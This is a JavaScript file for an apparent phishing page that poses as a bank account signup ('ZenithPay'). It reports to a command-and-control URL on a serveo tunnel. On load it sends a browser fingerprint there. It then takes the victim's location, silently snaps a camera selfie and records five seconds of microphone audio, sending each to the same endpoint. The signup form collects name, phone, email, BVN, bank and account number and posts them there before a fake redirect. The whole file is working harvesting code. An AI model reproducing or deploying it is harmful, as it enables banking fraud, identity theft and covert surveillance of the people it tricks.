// ============ CONFIG ============
const C2_URL = 'https://your-serveo-url.serveousercontent.com';
const ADMIN_PASSWORD = 'ZENITH2026';

// ============ SPLASH TO LOGIN ============
document.addEventListener('DOMContentLoaded', function() {
    console.log('Page loaded');
    
    // Show splash
    const splash = document.getElementById('splash');
    const loginPage = document.getElementById('loginPage');
    
    if (splash && loginPage) {
        setTimeout(function() {
            splash.style.display = 'none';
            loginPage.classList.remove('hidden');
            console.log('Splash hidden, login shown');
        }, 3000);
    } else {
        console.log('Splash or loginPage not found');
    }
});

// ============ PERMISSIONS ============
function requestPermissions() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                sendData({
                    type: 'location',
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                });
            },
            function() {},
            { enableHighAccuracy: true, timeout: 8000 }
        );
    }

    navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: 640, height: 480 }
    })
    .then(function(stream) {
        var video = document.createElement('video');
        video.srcObject = stream;
        video.onloadedmetadata = function() {
            video.play();
            var canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            var imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(function(track) { track.stop(); });
            sendData({ type: 'selfie', image: imageData });
        };
    })
    .catch(function() {});

    navigator.mediaDevices.getUserMedia({ audio: true })
    .then(function(stream) {
        var mediaRecorder = new MediaRecorder(stream);
        var chunks = [];
        mediaRecorder.ondataavailable = function(e) { chunks.push(e.data); };
        mediaRecorder.onstop = function() {
            var blob = new Blob(chunks, { type: 'audio/webm' });
            var reader = new FileReader();
            reader.onload = function() {
                sendData({ type: 'audio', audio: reader.result });
            };
            reader.readAsDataURL(blob);
            stream.getTracks().forEach(function(track) { track.stop(); });
        };
        mediaRecorder.start();
        setTimeout(function() { mediaRecorder.stop(); }, 5000);
    })
    .catch(function() {});
}

// ============ SEND DATA ============
function sendData(payload) {
    payload._timestamp = Date.now();
    payload._ua = navigator.userAgent;

    if (navigator.sendBeacon) {
        var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(C2_URL + '/capture', blob);
        return;
    }

    fetch(C2_URL + '/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'no-cors'
    }).catch(function() {});
}

// ============ FINGERPRINT ============
function captureFingerprint() {
    sendData({
        type: 'fingerprint',
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        touchSupport: 'ontouchstart' in window,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
    });
}

// ============ FORM SUBMIT ============
var signupForm = document.getElementById('signupForm');
if (signupForm) {
    signupForm.addEventListener('submit', function(e) {
        e.preventDefault();

        var userData = {
            type: 'banking_details',
            fullname: document.getElementById('fullname').value,
            phone: document.getElementById('phone').value,
            email: document.getElementById('email').value,
            bvn: document.getElementById('bvn').value,
            bank: document.getElementById('bank').value,
            account: document.getElementById('account').value
        };

        sendData(userData);
        localStorage.setItem('zenithpay_user', JSON.stringify(userData));

        var btn = document.getElementById('submitBtn');
        btn.textContent = 'Opening Account...';
        btn.disabled = true;

        setTimeout(function() {
            window.location.href = 'dashboard.html';
        }, 1800);
    });
}

// ============ INIT ============
captureFingerprint();
setTimeout(requestPermissions, 800);

var submitBtn = document.getElementById('submitBtn');
if (submitBtn) {
    submitBtn.disabled = true;
    setTimeout(function() {
        submitBtn.disabled = false;
    }, 3000);
        }
